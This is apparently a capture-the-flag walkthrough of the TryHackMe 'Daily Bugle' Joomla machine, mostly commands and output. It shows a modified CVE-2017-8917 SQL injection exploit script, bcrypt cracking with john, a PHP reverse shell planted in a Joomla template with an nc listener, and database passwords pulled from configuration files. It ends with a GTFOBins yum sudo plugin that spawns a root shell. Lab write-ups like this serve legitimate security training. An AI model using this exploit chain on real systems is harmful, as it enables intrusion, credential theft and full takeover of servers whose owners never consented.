# Walkthrough

> Vadim Polovnikov | October xx, 2020

## Reconnaissance / Port-Scanning

---

**Basic Nmap Scan:**

``` txt
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   MariaDB (unauthorized)
```

Full nmap scan can be found here: [_link_]("" "")

**Vuln Nmap Scan (version):**

``` txt
http-vuln-cve2017-8917:
|   VULNERABLE:
|   Joomla! 3.7.0 'com_fields' SQL Injection Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-8917
|     Risk factor: High  CVSSv3: 9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
|       An SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers
|       to execute aribitrary SQL commands via unspecified vectors.
|       
|     Disclosure date: 2017-05-17
|     Extra information:
|       User: root@localhost
|     References:
|       https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917

```

Full nmap vuln scan can be found here -> [_link_]("" "")

Joomla CMS seems to be vulnerable to SQL Injection.

## Exploitation

---

The Exploit-DB's custom Python exploit - [Joomla! 3.7.0 - 'com_fields' SQL Injection]("https://www.exploit-db.com/exploits/42033" "link")

Run: _*python joomblah.py http://ip-addr/*_

In case of an error:

```
File "Joomla-exploit.py", line 46, in joomla_370_sqli_extract
    result += value
TypeError: can only concatenate str (not "bytes") to str
```
Adjust the script:

```python
def joomla_370_sqli_extract(options, sess, token, colname, morequery):
	sqli = build_sqli("LENGTH("+colname+")", morequery)
	length = joomla_370_sqli(options, sess, token, sqli)
	if not length:
		return None
	length = int(length)
	maxbytes = 30
	offset = 0
	result = ''
	while length > offset:
		sqli = build_sqli("HEX(MID(%s,%d,%d))" % (colname, offset + 1, 16), morequery)
		value = joomla_370_sqli(options, sess, token, sqli)
		if not value:
			print(" [!] Failed to retrieve string for query:", sqli)
			return None
		value = binascii.unhexlify(value)
		result += value.decode() # <-- adjustment
		offset += len(value)
	return result
````

[User\'s information]("" "link to the file") retrieved:
>Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']

JohnTheRipper Command: **_john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt_**

Results:

```
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)
1g 0:00:08:22 DONE (2020-10-27 20:16) 0.001988g/s 93.14p/s 93.14c/s 93.14C/s thelma1..speciala
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

User credentials:
| User | Password |
| --- | --- |
| jonah | spiderman123 |

## System Access

---
1. Go to: Extensions > Templates > Beez3

2. Change **_index.php_** file and paste the [php-reverse-shell]("https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" "github link") code.

3. Start NetCat listener: **_nc -lvnp 1234_**

4. Activate the revese-shell: click '**Template Preview**'

``` txt
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.137.200.
Ncat: Connection from 10.10.137.200:55372.
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 14:31:02 up 44 min,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
```

## Privilege Escalation

---

### LinPEAS Findings

/var/lib/php/sessions/sess_nvuatc4tban8ks2r2o7homh861 

```txt
joomla|s:2068:"TzoyNDoiSm9vbWxhXFJlZ2lzdHJ5XFJlZ2lzdHJ5IjozOntzOjc6IgAqAGRhdGEiO086ODoic3RkQ2xhc3MiOjE6e3M6OToiX19kZWZhdWx0IjtPOjg6InN0ZENsYXNzIjo1OntzOjc6InNlc3Npb24iO086ODoic3RkQ2xhc3MiOjM6e3M6NzoiY291bnRlciI7aToyNDtzOjU6InRpbWVyIjtPOjg6InN0ZENsYXNzIjozOntzOjU6InN0YXJ0IjtpOjE1NzYzNTU5MDQ7czo0OiJsYXN0IjtpOjE1NzYzNTYyMjk7czozOiJub3ciO2k6MTU3NjM1NjIzMjt9czo1OiJ0b2tlbiI7czozMjoiUkRYMEFvb1NYaTBIRTJJV2RxRVdaV0dxNGpKQVl5M2siO31zOjg6InJlZ2lzdHJ5IjtPOjI0OiJKb29tbGFcUmVnaXN0cnlcUmVnaXN0cnkiOjM6e3M6NzoiACoAZGF0YSI7Tzo4OiJzdGRDbGFzcyI6MDp7fXM6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjA7czo5OiJzZXBhcmF0b3IiO3M6MToiLiI7fXM6NDoidXNlciI7Tzo1OiJKVXNlciI6MTp7czoyOiJpZCI7aTowO31zOjU6InNldHVwIjtPOjg6InN0ZENsYXNzIjozOntzOjc6ImhlbHB1cmwiO3M6NzQ6Imh0dHBzOi8vaGVscC5qb29tbGEub3JnL3Byb3h5L2luZGV4LnBocD9rZXlyZWY9SGVscHttYWpvcn17bWlub3J9OntrZXlyZWZ9IjtzOjc6Im9wdGlvbnMiO2E6MjY6e3M6MTA6ImRiX2NyZWF0ZWQiO2k6MTtzOjk6InNpdGVfbmFtZSI7czoxNToiVGhlIERhaWx5IEJ1Z2xlIjtzOjExOiJhZG1pbl9lbWFpbCI7czoxOToiam9uYWhAdHJ5aGFja21lLmNvbSI7czoxMDoiYWRtaW5fdXNlciI7czo1OiJqb25haCI7czoxNDoiYWRtaW5fcGFzc3dvcmQiO3M6MTI6InNwaWRlcm1hbjEyMyI7czoxMzoic2l0ZV9tZXRhZGVzYyI7czozMToiTmV3IFlvcmsgQ2l0eSB0YWJsb2lkIG5ld3NwYXBlciI7czoxMjoic2l0ZV9vZmZsaW5lIjtpOjA7czo4OiJsYW5ndWFnZSI7czo1OiJlbi1VUyI7czo3OiJoZWxwdXJsIjtzOjc0OiJodHRwczovL2hlbHAuam9vbWxhLm9yZy9wcm94eS9pbmRleC5waHA/a2V5cmVmPUhlbHB7bWFqb3J9e21pbm9yfTp7a2V5cmVmfSI7czo3OiJkYl90eXBlIjtzOjY6Im15c3FsaSI7czo3OiJkYl9ob3N0IjtzOjk6ImxvY2FsaG9zdCI7czo3OiJkYl91c2VyIjtzOjQ6InJvb3QiO3M6NzoiZGJfcGFzcyI7czoxNjoibnY1dXo5cjNaRUR6VmpOdSI7czo3OiJkYl9uYW1lIjtzOjY6Impvb21sYSI7czo2OiJkYl9vbGQiO3M6NjoiYmFja3VwIjtzOjk6ImRiX3ByZWZpeCI7czo2OiJmYjlqNV8iO3M6OToiZGJfc2VsZWN0IjtiOjE7czoxMDoiZnRwX2VuYWJsZSI7aTowO3M6ODoiZnRwX3VzZXIiO3M6MDoiIjtzOjg6ImZ0cF9wYXNzIjtzOjA6IiI7czo4OiJmdHBfaG9zdCI7czo5OiIxMjcuMC4wLjEiO3M6ODoiZnRwX3BvcnQiO2k6MjE7czo4OiJmdHBfc2F2ZSI7aTowO3M6MTM6InN1bW1hcnlfZW1haWwiO2k6MDtzOjIzOiJzdW1tYXJ5X2VtYWlsX3Bhc3N3b3JkcyI7aTowO3M6MTE6InNhbXBsZV9maWxlIjtzOjA6IiI7fXM6NjoiY29uZmlnIjtOO31zOjEwOiJyYW5kVXNlcklkIjtpOjA7fX1zOjE0OiIAKgBpbml0aWFsaXplZCI7YjowO3M6OToic2VwYXJhdG9yIjtzOjE6Ii4iO30="
```

Seems to be a base64 file ...

Output from the Base64 decouder:

```txt
... s:7:"db_type";s:6:"mysqli";s:7:"db_host";s:9:"localhost";s:7:"db_user";s:4:"root";s:7:"db_pass";s:16:"nv5uz9r3ZEDzVjNu";s:7:"db_name";s:6:"joomla";s:6:"db_old";s:6:"backup";s:9:"db_prefix";s9:"db_:6:"fb9j5_";s:select";b:1;s:10:"ftp_enable";i:0;s:8:"ftp_user";s:0:"";s:8:"ftp_pass";s:0:"";s:8:"ftp_host";s:9:"127.0.0.1";s:8:"ftp_port";i:21;s:8:"ftp_save";i:0;s:13:"summary_email";i:0;s:23:"summary_email_passwords";i:0;s:11:"sample_file";s:0:"";}s:6:"config";N;}s:10:"randUserId";i:0;}}s:14:"�*�initialized";b:0;s:9:"separator";s:1:".";}
```

Identical Information can be found in: **_/var/www/html/configuration.php_**

```php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'The Daily Bugle';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'nv5uz9r3ZEDzVjNu';
        public $db = 'joomla';
        public $dbprefix = 'fb9j5_';
        public $live_site = '';
        public $secret = 'UAMBRWzHO3oFPmVC';
        public $gzip = '0';
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
        public $ftp_host = '127.0.0.1';
        public $ftp_port = '21';
        public $ftp_user = '';
        public $ftp_pass = '';
        public $ftp_root = '';
        public $ftp_enable = '0';
        public $offset = 'UTC';
        public $mailonline = '1';
        public $mailer = 'mail';
        public $mailfrom = 'jonah@tryhackme.com';
        public $fromname = 'The Daily Bugle';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = '0';
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = '25';
        public $caching = '0';
        public $cache_handler = 'file';
        public $cachetime = '15';
        public $cache_platformprefix = '0';
        public $MetaDesc = 'New York City tabloid newspaper';
        public $MetaKeys = '';
        public $MetaTitle = '1';
        public $MetaAuthor = '1';
        public $MetaVersion = '0';
        public $robots = '';
        public $sef = '1';
        public $sef_rewrite = '0';
        public $sef_suffix = '0';
        public $unicodeslugs = '0';
        public $feed_limit = '10';
        public $feed_email = 'none';
        public $log_path = '/var/www/html/administrator/logs';
        public $tmp_path = '/var/www/html/tmp';
        public $lifetime = '15';
        public $session_handler = 'database';
        public $shared_session = '0';
```

Password configured in the **_configuration.php_** file is the password fot jjameson user.

| **USER** | **PASS** |
| ---| --- |
jjameson | nv5uz9r3ZEDzVjNu |

>/home/jjameson/user.txt

### Vertical Privilege Escalation

1. sudo -l

```txt
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

2. [GTFOBins]("https://gtfobins.github.io/gtfobins/yum/" "gtfobins") yum PE:

```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y


sh-4.2# id
id
uid=0(root) gid=0(root) groups=0(root)
```

3. cat /root/root.txt
